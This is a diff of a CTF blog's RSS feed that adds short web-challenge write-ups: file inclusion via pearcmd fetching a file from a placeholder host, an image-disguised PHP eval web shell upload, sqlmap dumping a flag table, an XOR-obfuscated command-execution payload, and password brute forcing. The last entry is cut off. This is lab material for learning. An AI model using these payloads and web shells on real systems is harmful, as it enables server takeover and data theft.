@@ -85,7 +85,13 @@
         <category>通过php_value来设置preg_macth正则回溯次数</category>
         <category>java反序列化</category>
         <category>伪随机数</category>
+        <category>mysql</category>
         <category>信息搜集（js，网络）</category>
+        <category>异或</category>
+        <category>密码爆破</category>
+        <category>sqlmap使用</category>
+        <category>SQL注入</category>
+        <category>文件包含</category>
         <item>
             <guid isPermalink="true">http://odiws.github.io/2025/02/26/HMGCTF2022-Fan-Website/</guid>
             <title>[HMGCTF2022]Fan_Website</title>
@@ -195,6 +201,39 @@ ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in &#39;(1 + ~(0))&#39
  ]]></description>
         </item>
         <item>
+            <guid isPermalink="true">http://odiws.github.io/2025/02/23/NewStarCTF-2023-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93Include/</guid>
+            <title>NewStarCTF_2023_公开赛道Include</title>
+            <link>http://odiws.github.io/2025/02/23/NewStarCTF-2023-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93Include/</link>
+            <category>buuctf</category>
+            <category>文件包含</category>
+            <pubDate>Sun, 23 Feb 2025 19:20:05 +0800</pubDate>
+            <description><![CDATA[ &lt;h2 id=&#34;newstarctf-2023-公开赛道include&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#newstarctf-2023-公开赛道include&#34;&gt;#&lt;/a&gt; [NewStarCTF 2023 公开赛道] Include 🍐&lt;/h2&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php
+    error_reporting(0);
+    if(isset($_GET[&#39;file&#39;])) &amp;#123;
+        $file = $_GET[&#39;file&#39;];
+        
+        if(preg_match(&#39;/flag|log|session|filter|input|data/i&#39;, $file)) &amp;#123;
+            die(&#39;hacker!&#39;);
+        &amp;#125;
+        
+        include($file.&amp;quot;.php&amp;quot;);
+        # Something in phpinfo.php!
+    &amp;#125;
+    else &amp;#123;
+        highlight_file(__FILE__);
+    &amp;#125;
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;paylaod:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;?f=pearcmd&amp;amp;+install+-R+/var/www/html+http://ip:port/eval.php
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://zty--666.oss-cn-shanghai.aliyuncs.com/202502231925691.png&#34; alt=&#34;image-20250223192533238&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://zty--666.oss-cn-shanghai.aliyuncs.com/202502231925605.png&#34; alt=&#34;image-20250223192547479&#34;&gt;&lt;/p&gt;
+&lt;p&gt;eval.php:&lt;/p&gt;
+&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;&amp;lt;?php system($_GET[0]);&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt; ]]></description>
+        </item>
+        <item>
             <guid isPermalink="true">http://odiws.github.io/2025/02/09/BSidesCF2019-Sequel/</guid>
             <title>[BSidesCF2019]Sequel</title>
             <link>http://odiws.github.io/2025/02/09/BSidesCF2019-Sequel/</link>
@@ -221,6 +260,31 @@ ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in &#39;(1 + ~(0))&#39
 &lt;p&gt;获取密码登录即可&lt;/p&gt;
 &lt;p&gt;&lt;img data-src=&#34;https://zty--666.oss-cn-shanghai.aliyuncs.com/202502092209942.png&#34; alt=&#34;image-20250209220955859&#34;&gt;&lt;/p&gt;
 &lt;p&gt;参考链接：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9zeXVuYWh0LmNvbS9wLzM4MDk2MDU5ODIuaHRtbA==&#34;&gt;https://syunaht.com/p/3809605982.html&lt;/span&gt;&lt;/p&gt;
+ ]]></description>
+        </item>
+        <item>
+            <guid isPermalink="true">http://odiws.github.io/2025/01/26/NewStarCTF2023%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-EasyLogin/</guid>
+            <title>[NewStarCTF2023公开赛道]EasyLogin</title>
+            <link>http://odiws.github.io/2025/01/26/NewStarCTF2023%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-EasyLogin/</link>
+            <category>buuctf</category>
+            <category>密码爆破</category>
+            <pubDate>Sun, 26 Jan 2025 21:28:59 +0800</pubDate>
+            <description><![CDATA[ &lt;p&gt;[NewStarCTF2023 公开赛道] EasyLogin&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://zty--666.oss-cn-shanghai.aliyuncs.com/202501262138674.png&#34; alt=&#34;image-20250126213819604&#34;&gt;&lt;/p&gt;
+&lt;p&gt;登录页面，可以用爆破来进行密码爆破&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://zty--666.oss-cn-shanghai.aliyuncs.com/202501262139856.png&#34; alt=&#34;image-20250126213910800&#34;&gt;&lt;/p&gt;
+&lt;p&gt;获取这两个发现密码使用 md5 加密后的数据&lt;/p&gt;
+&lt;p&gt;所以爆破时需要进行 md5 加密后再进行爆破密码&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://zty--666.oss-cn-shanghai.aliyuncs.com/202501262141127.png&#34; alt=&#34;image-20250126214123038&#34;&gt;&lt;/p&gt;
+&lt;p&gt;登录成功&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://zty--666.oss-cn-shanghai.aliyuncs.com/202501262142196.png&#34; alt=&#34;image-20250126214224157&#34;&gt;&lt;/p&gt;
+&lt;p&gt;解码为 000000 密码&lt;/p&gt;
+&lt;p&gt;用以登录&lt;img data-src=&#34;https://zty--666.oss-cn-shanghai.aliyuncs.com/202501262143743.png&#34; alt=&#34;image-20250126214338654&#34;&gt;&lt;/p&gt;
+&lt;p&gt;以 admin 的身份进入页面但是跟直接注册登录一样的&lt;/p&gt;
+&lt;p&gt;找历史记录找到奇怪的东西直接发包就行了&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://zty--666.oss-cn-shanghai.aliyuncs.com/202501262156704.png&#34; alt=&#34;image-20250126215616594&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://zty--666.oss-cn-shanghai.aliyuncs.com/202501262156525.png&#34; alt=&#34;image-20250126215602329&#34;&gt;&lt;/p&gt;
+&lt;p&gt;参考：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzYwOTA1Mjc2L2FydGljbGUvZGV0YWlscy8xMzY5NDM0MDA=&#34;&gt;https://blog.csdn.net/qq_60905276/article/details/136943400&lt;/span&gt;&lt;/p&gt;
  ]]></description>
         </item>
         <item>
@@ -373,6 +437,28 @@ exit
 &lt;p&gt;&lt;img data-src=&#34;C:%5CUsers%5C86182%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241208154306356.png&#34; alt=&#34;image-20241208154306356&#34;&gt;&lt;/p&gt;
 &lt;p&gt;参考链接：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vQ0FQRC9wLzE3ODM1NzE1Lmh0bWw=&#34;&gt;https://www.cnblogs.com/CAPD/p/17835715.html&lt;/span&gt;&lt;/p&gt;
 &lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9jbi1zZWMuY29tL2FyY2hpdmVzLzExMTM0MjguaHRtbA==&#34;&gt;https://cn-sec.com/archives/1113428.html&lt;/span&gt;&lt;/p&gt;
+ ]]></description>
+        </item>
+        <item>
+            <guid isPermalink="true">http://odiws.github.io/2024/12/01/NewStarCT-2023-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-Upload-again/</guid>
+            <title>[NewStarCT_2023_公开赛道]Upload_again!</title>
+            <link>http://odiws.github.io/2024/12/01/NewStarCT-2023-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-Upload-again/</link>
+            <category>buuctf</category>
+            <category>文件上传</category>
+            <pubDate>Sun, 01 Dec 2024 21:23:47 +0800</pubDate>
+            <description><![CDATA[ &lt;p&gt;文件上传（先上传 htaccess 文件（虽然访问不了，但是可以用哇））：&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;C:%5CUsers%5C86182%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241201212849291.png&#34; alt=&#34;image-20241201212849291&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;C:%5CUsers%5C86182%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241201212929266.png&#34; alt=&#34;image-20241201212929266&#34;&gt;&lt;/p&gt;
+&lt;p&gt;上传 jpg 文件：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;GIF89a
+&amp;lt;script language=&amp;quot;php&amp;quot;&amp;gt;
+eval($_POST[&#39;cmd&#39;]);
+&amp;lt;/script&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;C:%5CUsers%5C86182%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241201213001489.png&#34; alt=&#34;image-20241201213001489&#34;&gt;&lt;/p&gt;
+&lt;p&gt;蚁剑链接&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;C:%5CUsers%5C86182%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241201213100531.png&#34; alt=&#34;image-20241201213100531&#34;&gt;&lt;/p&gt;
+&lt;p&gt;参考链接：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L015b241L2FydGljbGUvZGV0YWlscy8xMzM4MTk3NTg=&#34;&gt;https://blog.csdn.net/Myon5/article/details/133819758&lt;/span&gt;&lt;/p&gt;
  ]]></description>
         </item>
         <item>
@@ -714,6 +800,21 @@ if __name__ == &#39;__main__&#39;:
 &lt;p&gt;刷新后，成功以 admin 身份登陆，得到 flag：&lt;br&gt;
 &lt;img data-src=&#34;https://zty--666.oss-cn-shanghai.aliyuncs.com/202411172037747.png&#34; alt=&#34;image-20241117203753620&#34;&gt;&lt;/p&gt;
 &lt;p&gt;参考链接：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDAzNzI5Ni9hcnRpY2xlL2RldGFpbHMvMTEyNDc1MDUx&#34;&gt;https://blog.csdn.net/weixin_44037296/article/details/112475051&lt;/span&gt;&lt;/p&gt;
+ ]]></description>
+        </item>
+        <item>
+            <guid isPermalink="true">http://odiws.github.io/2024/11/10/NewStarCTF-2023-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-ez-sql/</guid>
+            <title>[NewStarCTF-2023-公开赛道]ez_sql</title>
+            <link>http://odiws.github.io/2024/11/10/NewStarCTF-2023-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-ez-sql/</link>
+            <category>buuctf</category>
+            <category>sqlmap使用</category>
+            <category>SQL注入</category>
+            <pubDate>Sun, 10 Nov 2024 16:03:42 +0800</pubDate>
+            <description><![CDATA[ &lt;h3 id=&#34;newstarctf-2023-公开赛道ez_sql&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#newstarctf-2023-公开赛道ez_sql&#34;&gt;#&lt;/a&gt; [NewStarCTF-2023 - 公开赛道] ez_sql&lt;/h3&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://zty--666.oss-cn-shanghai.aliyuncs.com/202411101612107.png&#34; alt=&#34;image-20241110161232932&#34;&gt;&lt;/p&gt;
+&lt;p&gt;sqlmap 直接注入就行了（还得配合一下盲注）&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;sqlmap &lt;span class=&#34;token parameter variable&#34;&gt;-u&lt;/span&gt; http://87173586-d547-42ca-a61c-7aaa6c3d70a2.node4.buuoj.cn:81/?id&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;TMP11503 &lt;span class=&#34;token parameter variable&#34;&gt;--dbs&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;sqlmap &lt;span class=&#34;token parameter variable&#34;&gt;-u&lt;/span&gt; http://87173586-d547-42ca-a61c-7aaa6c3d70a2.node4.buuoj.cn:81/?id&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;TMP11503 &lt;span class=&#34;token parameter variable&#34;&gt;-D&lt;/span&gt; ctf &lt;span class=&#34;token parameter variable&#34;&gt;-T&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;--clomns&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;sqlmap &lt;span class=&#34;token parameter variable&#34;&gt;-u&lt;/span&gt; http://87173586-d547-42ca-a61c-7aaa6c3d70a2.node4.buuoj.cn:81/?id&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;TMP11503 &lt;span class=&#34;token parameter variable&#34;&gt;-D&lt;/span&gt; ctf &lt;span class=&#34;token parameter variable&#34;&gt;-tables&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;sqlmap &lt;span class=&#34;token parameter variable&#34;&gt;-u&lt;/span&gt; http://87173586-d547-42ca-a61c-7aaa6c3d70a2.node4.buuoj.cn:81/?id&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;TMP11503 &lt;span class=&#34;token parameter variable&#34;&gt;-D&lt;/span&gt; ctf &lt;span class=&#34;token parameter variable&#34;&gt;-T&lt;/span&gt; here_is_flag &lt;span class=&#34;token parameter variable&#34;&gt;--clomns&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;sqlmap &lt;span class=&#34;token parameter variable&#34;&gt;-u&lt;/span&gt; http://87173586-d547-42ca-a61c-7aaa6c3d70a2.node4.buuoj.cn:81/?id&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;TMP11503 &lt;span class=&#34;token parameter variable&#34;&gt;-D&lt;/span&gt; ctf &lt;span class=&#34;token parameter variable&#34;&gt;-T&lt;/span&gt; here_is_flag &lt;span class=&#34;token parameter variable&#34;&gt;--columns&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;sqlmap &lt;span class=&#34;token parameter variable&#34;&gt;-u&lt;/span&gt; http://87173586-d547-42ca-a61c-7aaa6c3d70a2.node4.buuoj.cn:81/?id&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;TMP11503 &lt;span class=&#34;token parameter variable&#34;&gt;-D&lt;/span&gt; ctf &lt;span class=&#34;token parameter variable&#34;&gt;-T&lt;/span&gt; here_is_flag &lt;span class=&#34;token parameter variable&#34;&gt;-C&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;flag&#34;&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;--dump&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://zty--666.oss-cn-shanghai.aliyuncs.com/202411101614986.png&#34; alt=&#34;image-20241110161434804&#34;&gt;&lt;/p&gt;
+&lt;p&gt;参考链接：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzczNzI4MjY4L2FydGljbGUvZGV0YWlscy8xMzQyMDA2MzU=&#34;&gt;https://blog.csdn.net/m0_73728268/article/details/134200635&lt;/span&gt;&lt;/p&gt;
  ]]></description>
         </item>
         <item>
@@ -1296,6 +1397,66 @@ print(response.text)
             <category>flask</category>
             <pubDate>Wed, 25 Sep 2024 19:53:31 +0800</pubDate>
             <description><![CDATA[  ]]></description>
+        </item>
+        <item>
+            <guid isPermalink="true">http://odiws.github.io/2024/09/24/NESTCTF2019-LoveMath2/</guid>
+            <title>[NESTCTF2019]LoveMath2</title>
+            <link>http://odiws.github.io/2024/09/24/NESTCTF2019-LoveMath2/</link>
+            <category>buuctf</category>
+            <category>异或</category>
+            <pubDate>Tue, 24 Sep 2024 21:03:49 +0800</pubDate>
+            <description><![CDATA[ &lt;h2 id=&#34;nestctf2019lovemath2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#nestctf2019lovemath2&#34;&gt;#&lt;/a&gt; [NESTCTF2019]LoveMath2&lt;/h2&gt;
+&lt;p&gt;源码&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php
+error_reporting(0);
+//听说你很喜欢数学，不知道你是否爱它胜过爱flag
+if(!isset($_GET[&#39;c&#39;]))&amp;#123;
+    show_source(__FILE__);
+&amp;#125;else&amp;#123;
+    //例子 c=20-1
+    $content = $_GET[&#39;c&#39;];
+    if (strlen($content) &amp;gt;= 60) &amp;#123;
+        die(&amp;quot;太长了不会算&amp;quot;);
+    &amp;#125;
+    $blacklist = [&#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\n&#39;,&#39;\&#39;&#39;, &#39;&amp;quot;&#39;, &#39;`&#39;, &#39;\[&#39;, &#39;\]&#39;];
+    foreach ($blacklist as $blackitem) &amp;#123;
+        if (preg_match(&#39;/&#39; . $blackitem . &#39;/m&#39;, $content)) &amp;#123;
+            die(&amp;quot;请不要输入奇奇怪怪的字符&amp;quot;);
+        &amp;#125;
+    &amp;#125;
+    //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp
+    $whitelist = [&#39;abs&#39;, &#39;acos&#39;, &#39;acosh&#39;, &#39;asin&#39;, &#39;asinh&#39;, &#39;atan2&#39;, &#39;atan&#39;, &#39;atanh&#39;,  &#39;bindec&#39;, &#39;ceil&#39;, &#39;cos&#39;, &#39;cosh&#39;, &#39;decbin&#39; , &#39;decoct&#39;, &#39;deg2rad&#39;, &#39;exp&#39;, &#39;expm1&#39;, &#39;floor&#39;, &#39;fmod&#39;, &#39;getrandmax&#39;, &#39;hexdec&#39;, &#39;hypot&#39;, &#39;is_finite&#39;, &#39;is_infinite&#39;, &#39;is_nan&#39;, &#39;lcg_value&#39;, &#39;log10&#39;, &#39;log1p&#39;, &#39;log&#39;, &#39;max&#39;, &#39;min&#39;, &#39;mt_getrandmax&#39;, &#39;mt_rand&#39;, &#39;mt_srand&#39;, &#39;octdec&#39;, &#39;pi&#39;, &#39;pow&#39;, &#39;rad2deg&#39;, &#39;rand&#39;, &#39;round&#39;, &#39;sin&#39;, &#39;sinh&#39;, &#39;sqrt&#39;, &#39;srand&#39;, &#39;tan&#39;, &#39;tanh&#39;];
+    preg_match_all(&#39;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#39;, $content, $used_funcs);
+    foreach ($used_funcs[0] as $func) &amp;#123;
+        if (!in_array($func, $whitelist)) &amp;#123;
+            die(&amp;quot;请不要输入奇奇怪怪的函数&amp;quot;);
+        &amp;#125;
+    &amp;#125;
+    //帮你算出答案
+    eval(&#39;echo &#39;.$content.&#39;;&#39;);
+&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;之前有一道 Love math 解法一样，直接放 payload&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;?c=$pi=(is_nan^(6).(4)).(tan^(1).(5));$pi=$$pi;$pi&amp;#123;0&amp;#125;($pi&amp;#123;1&amp;#125;)&amp;amp;0=system&amp;amp;1=cat%20/flag
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;解释&lt;br&gt;
+ (is_nan&lt;sup&gt;(6).(4)).(tan&lt;/sup&gt; (1).(5)) 结果是_GET&lt;br&gt;
+&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;msub&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mi&gt;G&lt;/mi&gt;&lt;/msub&gt;&lt;mi&gt;E&lt;/mi&gt;&lt;mi&gt;T&lt;/mi&gt;&lt;mtext&gt;，&lt;/mtext&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;pi=_GET，&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.85396em;vertical-align:-0.19444em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.32833099999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathnormal mtight&#34;&gt;G&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.68333em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.05764em;&#34;&gt;E&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.13889em;&#34;&gt;T&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;，&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;pi=&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.85396em;vertical-align:-0.19444em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;_GET&lt;br&gt;
+php 中，get 方法的 [] 可以用 {} 替代，&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mn&gt;0&lt;/mn&gt;&lt;mo stretchy=&#34;false&#34;&gt;(&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;pi{0}(&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;pi {1}) 即&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msub&gt;&lt;mrow&gt;&lt;/mrow&gt;&lt;mi&gt;G&lt;/mi&gt;&lt;/msub&gt;&lt;mi&gt;E&lt;/mi&gt;&lt;mi&gt;T&lt;/mi&gt;&lt;mn&gt;0&lt;/mn&gt;&lt;mo stretchy=&#34;false&#34;&gt;(&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;_GET{0}(&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.32833099999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathnormal mtight&#34;&gt;G&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; 